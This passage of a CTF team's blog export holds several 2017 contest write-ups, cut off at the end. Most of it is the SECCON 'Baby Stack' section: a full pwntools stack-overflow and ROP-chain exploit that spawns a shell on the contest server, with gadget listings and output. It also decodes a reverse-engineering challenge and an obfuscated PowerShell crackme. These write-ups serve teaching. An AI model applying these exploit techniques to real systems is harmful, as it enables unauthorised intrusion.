Flag","slug":"Reverse-3DS-Scared-Flag","date":"2017-12-18T03:58:03.000Z","updated":"2018-10-24T23:21:04.862Z","comments":true,"path":"2017/12/18/Reverse-3DS-Scared-Flag/","link":"","permalink":"https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/","excerpt":"","text":"Scared Flag - 479 Pointsヽ(ﾟДﾟ)ﾉ After unzipping the file we can see that we have a .hex which according to Wikipedia: Intel HEX is a file format that conveys binary information in ASCII text form. It is commonly used for programming microcontrollers, EPROMs, and other types of programmable logic devices. In a typical application, a compiler or assembler converts a program’s source code (such as in C or assembly language) to machine code and outputs it into a HEX file. So after finding out what the hell was this I searched in the web a way to convert this into a binary format or assembly, and I found a post in stack overflow recommending to use this… After downloading, I made the conversion: 12345678910111213$ ./hex2bin -b ../ea137e7356e566945e51bbece00a22ad.hex hex2bin v2.5, Copyright (C) 2017 Jacques Pelletier &amp; contributorsAllocate_Memory_and_Rewind:Lowest address: 00000000Highest address: 00000BC5Starting address: 00000000Max Length: 3014Binary file start = 00000000Records start = 00000000Highest address = 00000BC5Pad Byte = FF The program outputs a ea137e7356e566945e51bbece00a22ad.bin, I used radare2 to reverse it, after checking the code I saw the initials of the flag in this routine at fcn.000005de (You need to scroll down a little in radare2 the function is quite big).The flag was 3DS{youareabully}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"},{"name":"intel_hex","slug":"intel-hex","permalink":"https://teamrocketist.github.io/tags/intel-hex/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"hex2bin","slug":"hex2bin","permalink":"https://teamrocketist.github.io/tags/hex2bin/"}]},{"title":"[Pwn] SECCON - Baby Stack","slug":"Pwn-SECCON-Baby-Stack","date":"2017-12-13T04:05:45.000Z","updated":"2018-11-06T04:27:48.966Z","comments":true,"path":"2017/12/13/Pwn-SECCON-Baby-Stack/","link":"","permalink":"https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/","excerpt":"","text":"Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Overflow the BufferWe have a go executable which is harder to reverse than c, by reading the challenge title we can see that this challenge is probably about a buffer overflow in the stack, another thing we also notice that the binary is statically linked: 12$ file baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped Since is statically linked we know that this binary isn’t going to use the libc file in our system, every libc function used is embedded in the binary itself, this a problem we can’t just jump into libc because some useful functions like system aren’t present, but we can still build a ROP chain that does a system call to execve, this is very similar to writting shellcode but instead of writting a script we are going to use gadgets to build it. By checking the security of the binary we can see the only protection enabled is NX (Non-Executable Stack). 123456checksecCANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : disabled We don’t have a stack canary to stop us so the first thing to do is to run the binary: 12345678910111213141516171819202122232425262728293031323334$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Please tell me your name &gt;&gt; AGive me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaunexpected fault address 0x0fatal error: fault[signal 0xb code=0x80 addr=0x0 pc=0x456551]goroutine 1 [running]:runtime.throw(0x507550, 0x5) /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003f5b8 sp=0xc82003f5a0runtime.sigpanic() /usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003f608 sp=0xc82003f5b8runtime.memmove(0xc82008a00b, 0x4141414141414141, 0x61414141) /usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003f610 sp=0xc82003f608fmt.(*fmt).padString(0xc82006ebb8, 0x4141414141414141, 0x61414141) /usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003f730 sp=0xc82003f610fmt.(*fmt).fmt_s(0xc82006ebb8, 0x4141414141414141, 0x61414141) /usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003f760 sp=0xc82003f730fmt.(*pp).fmtString(0xc82006eb60, 0x4141414141414141, 0x61414141, 0xc800000073) /usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003f790 sp=0xc82003f760fmt.(*pp).printArg(0xc82006eb60, 0x4c1c00, 0xc82000a380, 0x73, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003f918 sp=0xc82003f790fmt.(*pp).doPrintf(0xc82006eb60, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2) /usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003fca0 sp=0xc82003f918fmt.Fprintf(0x7fcd857d21e8, 0xc82002c010, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x40beee, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003fce8 sp=0xc82003fca0fmt.Printf(0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x20, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003fd50 sp=0xc82003fce8main.main() /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003ff50 sp=0xc82003fd50runtime.main() /usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003ffa0 sp=0xc82003ff50runtime.goexit() /usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003ffa8 sp=0xc82003ffa0 We did overflow the buffer but what really happened here? If you look at the stack traces we aren’t really getting a segmentation fault because we are replacing the ret address, the exception is occurring because we are changing the parameters of fmt.Printf, the binary isn’t reaching the ret instruction because of this, we need to set some break points before this prints to put the correct addresses on them, something that doesn’t crash the program. To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named main_main and tryed to find a function bufio___Scanner__Scan which in go is a function that reads inputs from the STDIN.Checking it on another view to check its addresses: After setting some breakpoints in the printf’s after those 2 scans, I realised that the padding needed to reach the 1st parameter was 104 so we can start testing it in the binary: 12345678$ python -c \"print 'A'*104 + 'BBBBBBBB'\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Please tell me your name &gt;&gt; AGive me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB...runtime.memmove(0xc82000e30b, 0x4242424242424242, 0x1)... There it is, we are replacing the address of the string that printf wants to print, we can’t continue overflowing the rest to reach the ret instruction, to get this valid address I just picked a value that I got from gdb from the stack: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849gdb-peda$ b *0x4011D2Note: breakpoint 1 also set at pc 0x4011d2.Breakpoint 2 at 0x4011d2: file /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go, line 18.gdb-peda$ rStarting program: /baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 [New LWP 8293][New LWP 8294][New LWP 8295]Please tell me your name &gt;&gt; A[----------------------------------registers-----------------------------------]RAX: 0x1 RBX: 0x0 RCX: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)RDX: 0xc820074000 --&gt; 0xa41 (&apos;A\\n&apos;)RSI: 0xc820074000 --&gt; 0xa41 (&apos;A\\n&apos;)RDI: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)RBP: 0x0 RSP: 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)RIP: 0x4011d2 (&lt;main.main+466&gt;: call 0x45ac40 &lt;fmt.Printf&gt;)R8 : 0x1 R9 : 0x1000 R10: 0xc820074000 --&gt; 0xa41 (&apos;A\\n&apos;)R11: 0x202 R12: 0x15 R13: 0x536a54 --&gt; 0x201fe001001e4 R14: 0x1 R15: 0x8EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x4011c3 &lt;main.main+451&gt;: mov QWORD PTR [rsp+0x10],rbx 0x4011c8 &lt;main.main+456&gt;: mov QWORD PTR [rsp+0x18],rbx 0x4011cd &lt;main.main+461&gt;: mov QWORD PTR [rsp+0x20],rbx=&gt; 0x4011d2 &lt;main.main+466&gt;: call 0x45ac40 &lt;fmt.Printf&gt; 0x4011d7 &lt;main.main+471&gt;: mov rbx,QWORD PTR [rsp+0x80] 0x4011df &lt;main.main+479&gt;: mov QWORD PTR [rsp],rbx 0x4011e3 &lt;main.main+483&gt;: call 0x46cbc0 &lt;bufio.(*Scanner).Scan&gt; 0x4011e8 &lt;main.main+488&gt;: mov rax,QWORD PTR [rsp+0x80]No argument[------------------------------------stack-------------------------------------]0000| 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)0008| 0xc82003fd58 --&gt; 0x18 0016| 0xc82003fd60 --&gt; 0x0 0024| 0xc82003fd68 --&gt; 0x0 0032| 0xc82003fd70 --&gt; 0x0 0040| 0xc82003fd78 --&gt; 0x1 0048| 0xc82003fd80 --&gt; 0x0 0056| 0xc82003fd88 --&gt; 0x0 [------------------------------------------------------------------------------] For example an address from the stack can be something like 0xc82003fd58 with this we can start writing the exploit: 12345678from pwn import *padding = 'A' * 104 + p64(0xc82003fd58) + 'AAAAAAAA'process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8')r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')r.sendline(padding)r.interactive() By running it we can see we are still replacing another parameter from printf: 123456789python writeup.py [+] Starting local process './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8': pid 8433[*] Switching to interactive modepanic: runtime error: growslice: cap out of rangegoroutine 1 [running]:panic(0x4e4800, 0xc820070280) /usr/lib/go-1.6/src/runtime/panic.go:481 +0x3e6fmt.(*fmt).padString(0xc820076ef8, 0xc82003fd58, 0x4141414141414141) In this case we are replacing the number of characters that are going to be printed by printf! for example if we set the next 8 bytes to be 0x0000000000000002, printf will print 2 characters starting by the address we gave before in the previous 8 bytes (0xc82003fd58). So lets readjust our script to do this:12345678from pwn import *padding = 'A' * 104 + p64(0xc82003fd58) + p64(0x3)process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8')r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')r.sendline(padding)r.interactive() 12345$ python writeup.py... Thank you, \\x18\\x00\\x00!msg : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[*] Got EOF while reading in interactive As you can see we are no longer seg faulting and as I said before you can see that only 3 bytes are being printed after the string “Thank you, “ we need to calculate the offset to the next printf and do the same thing, give an address and the number of bytes to be printed, only then we can replace the return address with success! So after calculating everything our script will look like this: 1234567891011121314from pwn import *off_printf1 = 104off_printf2 = 80off_retaddress = 192padding_printf1 = 'A' * off_printf1 + p64(0xc82003fd58) + p64(0x3)padding_printf2 = 'A' * off_printf2 + p64(0xc82003fd58) + p64(0x3)padding_retaddresss = 'A'*off_retaddress + p64(0xdeadbeef)padding = padding_printf1 + padding_printf2 + padding_retaddresssr = process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8')r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')r.sendline(padding)r.interactive() And finally we succefully smashed the stack! and replaced the return address to 0xdeadbeef:1234567$ python writeup.py ...Thank you, \\x18\\x00\\x00!msg : X�\u0003unexpected fault address 0xdeadbeeffatal error: fault[signal 0xb code=0x1 addr=0xdeadbeef pc=0xdeadbeef] Build a ropchainNow that we replaced the return address to 0xdeadbeef we can finally start by doing our ropchain, to build this ropchain we need to know a bit of assembly but first we need to know how a syscall works as assembly and which registers it uses as arguments: 1syscall(RAX, RDI, RSI, RDX) Where RAX is the system call number and RDI must have an address that points into ‘/bin/sh’ the rest of the registers are about the arguments! in this case we can just set them into zeros… So to build a successful ropchain we need to search some good gadgets. Setting /bin/sh address to RDIFirst of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA: .bss is perfect its address doesn’t change on different runs because PIE protection isn’t enabled, and as the picture above says in IDA we have read and write permissions which is what we want. Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be MOV [RDI], RAX, with the preference that it’s a qword MOV, since /bin/sh is a quite big string we need a 64bit MOV (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with ROPGadgets, if we have a 64bit MOV: 1234567ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep 'mov qword ptr \\[rdi\\], '0x000000000045681b : clc ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret0x0000000000456826 : mov eax, dword ptr [rsi] ; mov qword ptr [rdi], rax ; ret0x0000000000456490 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rax ; ret0x000000000045681c : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret0x0000000000456499 : mov qword ptr [rdi], rax ; ret0x0000000000456825 : mov rax, qword ptr [rsi] ; mov qword ptr [rdi], rax ; ret There we go, the mov qword ptr [rdi], rax ; ret is the gadget we need! we just need to store the .bss address into RDI, and the string /bin/sh into RAX, to store them into RDI and RAX we need gadgets like POP RDI ; RET and POP RAX ; RET, this gadgets will get the value on the top of the stack and store it in the respective register that’s what POP does: 12345678$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep 'pop rdi ;'0x000000000044a282 : pop rdi ; adc eax, 0x24448900 ; and byte ptr [rcx], bh ; ret0x000000000042274f : pop rdi ; add byte ptr [rax], al ; add rsp, 0x20 ; ret0x0000000000429eea : pop rdi ; call 0x4010080x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep 'pop rax ; ret'0x00000000004016ea : pop rax ; ret0x0000000000429283 : pop rax ; ret 0xf66 We have both gadgets but as we can see the pop rdi ; or byte ptr [rax + 0x39], cl ; ret gadget has an instruction between POP RDI and RET, We require to set RAX into a valid address before using this gadget otherwise we SEGFAULT. Finally we have everything we need to store the address of /bin/sh into RDI: 12345678# setting /bin/sh into bss addressropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x0000000000470931) # pop rdi ; or byte ptr [rax + 0x39], cl ; retropchain += p64(BSS) # @.dataropchain += p64(0x4016ea) # pop rax ; retropchain += '/bin/sh\\x00'ropchain += p64(0x0000000000456499) # mov qword ptr [rdi], rax ; ret Clearing RSI and RDXNow that we have the address of /bin/sh in RDI we need to clear the registers RSI and RDX into zero, we can do this with POP RET gadgets : 1234567# clear rsi and rdx registersropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x00000000004a247c) # pop rdx ; or byte ptr [rax - 0x77], cl ; retropchain += p64(0x0)ropchain += p64(0x000000000046defd) # pop rsi ; retropchain += p64(0x0) And finally we can’t forget to set RAX into the execve system call number which is 0x3b, you can get a full list of system call numbers at https://filippo.io/linux-syscall-table/ , once again we can use POP RET gadget to do this: Setting 0x3b into RAX123456# setting rax into execve 0x3b syscall numberropchain += p64(0x00000000004016ea) # pop rax ; retropchain += p64(0x3b)# call system callropchain += p64(0x0000000000456889) # syscall ; ret My final Exploit will look like this: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *def getConn(): return process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8') if local else remote('baby_stack.pwn.seccon.jp', 15285)local = Falser = getConn()padding = 'A' * 104r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')BSS = 0x59F920ropchain = ''# setting /bin/sh into bss addressropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x0000000000470931) # pop rdi ; or byte ptr [rax + 0x39], cl ; retropchain += p64(BSS) # @.dataropchain += p64(0x4016ea) # pop rax ; retropchain += '/bin/sh\\x00'ropchain += p64(0x0000000000456499) # mov qword ptr [rdi], rax ; ret# clear rsi and rdx registersropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x00000000004a247c) # pop rdx ; or byte ptr [rax - 0x77], cl ; retropchain += p64(0x0)ropchain += p64(0x000000000046defd) # pop rsi ; retropchain += p64(0x0)# setting rax into execve 0x3b syscall numberropchain += p64(0x00000000004016ea) # pop rax ; retropchain += p64(0x3b)# call system callropchain += p64(0x0000000000456889) # syscall ; retr.sendline(padding + p64(0xc82003fd58) + p64(0x00) + 'A'*80 + p64(0xc82003fd58) + p64(0x00) + 'A'*192 + ropchain)r.interactive() By running it we can get the flag: 123456789101112$ python back_stack.py[+] Opening connection to baby_stack.pwn.seccon.jp on port 15285: Done[*] Switching to interactive modeThank you, !msg : $ lsbaby_stackflag.txt$ iduid=30831 gid=30000(baby_stack) groups=30000(baby_stack)$ cat flag.txtSECCON&#123;'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"go","slug":"go","permalink":"https://teamrocketist.github.io/tags/go/"},{"name":"seccon2017","slug":"seccon2017","permalink":"https://teamrocketist.github.io/tags/seccon2017/"},{"name":"statically_linked","slug":"statically-linked","permalink":"https://teamrocketist.github.io/tags/statically-linked/"}]},{"title":"[Reverse] SECCON - Powerful_Shell","slug":"Reverse-SECCON-Powerful-Shell","date":"2017-12-10T10:03:07.000Z","updated":"2018-10-24T23:21:04.834Z","comments":true,"path":"2017/12/10/Reverse-SECCON-Powerful-Shell/","link":"","permalink":"https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/","excerpt":"","text":"Powerful_Shell300 pointsPowerful_ShellCrack me.powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfca21ab53db15c98797b500c739b0024 Windows powershell… We started by analysing the file: 12345678910111213141516171819202122232425262728293031$ECCON=\"\";$ECCON+=[char](3783/291);$ECCON+=[char](6690/669);$ECCON+=[char](776-740);$ECCON+=[char](381-312);$ECCON+=[char](403-289);$ECCON+=[char](-301+415);$ECCON+=[char](143-32);$ECCON+=[char](93594/821);$ECCON+=[char](626-561);$ECCON+=[char](86427/873);$ECCON+=[char](112752/972);$ECCON+=[char](43680/416);$ECCON+=[char](95127/857);$ECCON+=[char](-682+792);$ECCON+=[char](-230+310);$ECCON+=[char](-732+846);$ECCON+=[char](1027-926);$ECCON+=[char](94044/922);$ECCON+=[char](898-797);$ECCON+=[char](976-862);$ECCON+=[char](52419/519);$ECCON+=[char](1430/13);$ECCON+=[char](18216/184);$ECCON+=[char](21715/215);$ECCON+=[char](12320/385);$ECCON+=[char]([int][Math]::sqrt([Math]::pow(61,2)));.....Write-Progress -Activity \"Extracting Script\" -status \"20040\" -percentComplete 99;$ECCON+=[char](520-510);Write-Progress -Completed -Activity \"Extracting Script\";.([ScriptBlock]::Create($ECCON)) As we can see we have alot of operations, it looks like something is being hidden behind those arithmetic operations, I did a python script to parse all the operation using regex: 12345678910111213import refrom math import *script = ''lines = open('powerful_shell','r').read().split('\\n')for line in lines: if 'sqrt' in line: op = line.replace('$ECCON+=[char]([int][Math]::','').replace('[Math]::','').replace(';','').replace(')','') + '))' script += chr(int(eval(op))) elif '$ECCON' in line and len(re.findall(r'\\((-*[0-9]+.-*[0-9]+)\\)', line)) &gt; 0: op = re.findall(r'\\((-*[0-9]+.-*[0-9]+)\\)', line)[0] script += chr(int(eval(op)))print script After extracting it we got this: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142... truncanted ...$keytone=@&#123;'a'=261.63&#125;$pk='a'ForEach($k in ('w','s','e','d','f','t','g','y','h','u','j','k'))&#123; $keytone+=@&#123;$k=$keytone[$pk]*[math]::pow(2,1/12)&#125;;$pk=$k &#125;Write-Host -b 00 -f 15 \"Play the secret melody.\"Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' | 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 ' | ' Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' | 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 ' | ' Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' w 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' e 'Write-Host -b 15 -f 00 -n ' | 'Write-Host -b 00 -f 15 -n ' t 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' y 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' u 'Write-Host -b 15 -f 00 ' | ' Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 ' 'Write-Host -b 15 -f 00 -n ' a |'Write-Host -b 15 -f 00 -n ' s |'Write-Host -b 15 -f 00 -n ' d |'Write-Host -b 15 -f 00 -n ' f |'Write-Host -b 15 -f 00 -n ' g |'Write-Host -b 15 -f 00 -n ' h |'Write-Host -b 15 -f 00 -n ' j |'Write-Host -b 15 -f 00 ' k 'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 ' 'Write-Host$stage1=@();$f=\"\";While($stage1.length -lt 14)&#123; $key=(Get-Host).ui.RawUI.ReadKey(\"NoEcho,IncludeKeyDown\") $k=[String]$key.Character $f+=$k; If($keytone.Contains($k))&#123; $stage1+=[math]::floor($keytone[$k]) [console]::beep($keytone[$k],500) &#125;&#125;$secret=@(440,440,493,440,440,493,440,493,523,493,440,493,440,349)If($secret.length -eq $stage1.length)&#123; For ($i=1; $i -le $secret.length; $i++) &#123; If($secret[$i] -ne $stage1[$i])&#123; Exit &#125; &#125; x \"Correct. Move to the next stage.\"&#125;$text=@\"YkwRUxVXQ05DQ1NOE1sVVU4TUxdTThBBFVdDTUwTURVTThMqFldDQUwdUxVRTBNEFVdAQUwRUxtTTBEzFVdDQU8RUxdTbEwTNxVVQUNOEFEVUUwdQBVXQ0NOE1EWUUwRQRtVQ0FME1EVUU8RThdVTUNMEVMVUUwRFxdVQUNCE1MXU2JOE0gWV0oxSk1KTEIoExdBSDBOE0MVO0NKTkAoERVDSTFKThNNFUwRFBVINUFJTkAqExtBSjFKTBEoF08RVRdKO0NKTldKMUwRQBc1QUo7SlNgTBNRFVdJSEZCSkJAKBEVQUgzSE8RQxdMHTMVSDVDSExCKxEVQ0o9SkwRQxVOE0IWSDVBSkJAKBEVQUgzThBXFTdDRExAKhMVQ0oxTxEzFzVNSkxVSjNOE0EWN0NITE4oExdBSjFMEUUXNUNTbEwTURVVSExCKxEVQ0o9SkwRQxVOEzEWSDVBSkJAKBEVQUgzThAxFTdDREwTURVKMUpOECoVThNPFUo3U0pOE0gWThNEFUITQBdDTBFKF08RQBdMHRQVQUwTSBVOEEIVThNPFUNOE0oXTBFDF0wRQRtDTBFKFU4TQxZOExYVTUwTSBVMEUEXTxFOF0NCE0oXTBNCFU4QQRVBTB1KFU4TThdMESsXQ04TRBVMEUMVThNXFk4TQRVNTBNIFUwRFBdPEUEXQ0ITShdME0EVThBXFU4TWxVDThNKF0wRMBdMETUbQ0wRShVOE0MWThMqFU1ME0gVTBFDF08RQxdMHUMVQUwTSBVOEEEVThNNFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNGF0wTKhVBTxFKF0wdMxVOEzUXQ04QSBVOE0AVTBFVFUFMEUkXTBFDG0wTQRVMETMXQE4TSBVCE0MXTBNBFU4QQRVBTB1KFU4TQxdMEVYXTBEUG0NMEUoVThNBFk4TQRVCEygXQ0wRShdPEUMXTB1DFU4TQBdDThBIFU4TSBVMESgVQUwRSRdMEUYbTBMWFUNOE0gWThNCFUITFBdDTBFKF08RQxdMHUMVThNVF0NOEEgVThNNFUwRQxVOE0IWQUwRShtME0EVTBFVF08RQxdDQhNKF0wTQRVOEEEVThM9FUNOE0oXTBFFF0wRKBtDTBFKFU4TQRZOE0EVQhNAF0NMEUoXTxFDF0wdVRVOEzMXQ04QSBVOE00VTBFVFU4TQRZBTBFKG0wTRBVMESgXQE4TSBVCE0MXTBNBFU4QKhVBTB1KFU4TFBdMEUIXQ04TRBVMEUMVThNBFk4TNxVNTBNIFUwRQxdPEUMXTB01FUFME0gVThBBFU4TTRVMERQVQUwRSRdMEUMbTBNBFUwRQxdAThNIFUITQxdME0EVThAxFUFMHUoVThNDF0wRVhdMEVUbQ0wRShVOE0QWThMWFU1ME0gVTBFDF08RRhdDQhNKF0wTQRVOEFcVQUwdShVOE0EXTBFFF0NOE0QVTBFDFU4TVxZOEyoVTUwTSBVMETMXTxFVF0NCE0oXTBNEFU4QQhVBTB1KFU4TQBdMERcXQ04TRBVMEUAVThNDFkFMEUobTBNCFUwRQRdAThNIFUITQRdMExYVQU8RShdMHUEVThNOF0NOEEgVThNIFUwRKBVBTBFJF0wRMxtMEzcVQ04TSBZOE0EVQhNVF0wTQRVBTxFKF0wdQxVOE0MXTBFFF0NOE0QVTBFGFU4TKhZBTBFKG0wTRBVMERQXQE4TSBVCE04XTBNXFUFPEUoXTB0zFU4TThdDThBIFU4TTRVMEUMVThMWFkFMEUobTBNCFUwRFBdAThNIFUITQxdME0EVThAxFUFMHUoVThNGF0wRQxdDThNEFUwRQRVOEyoWQUwRShtMEzcVTBFDF0BOE0gVQhMzF0wTFhVBTxFKF0wdMxVOExQXQ04QSBVOE0gVTBEUFUFMEUkXTBEzG0wTQRVDThNIFk4TQRVCEygXTBNEFUFPEUoXTB1DFU4TRhdDThBIFU4TTRVMEVUVQUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdMHTMVQUwTSBVOEEEVThNbFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwdShVOEzMXTBE2F0NOE0QVTBFBFU4TKhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsVQ04TShdMEUAXTBFDG0wTQhVDThNIFk4TRBVCEygXQ0wRShdPEUYXTB0UFUFME0gVThBDFU4TTRVDThNKF0wRQBdMEUMbTBNBFUNOE0gWThNBFUITQxdME0EVQU8RShdMHUMVThNVF0wRVhdDThNEFUwRRhVOEyo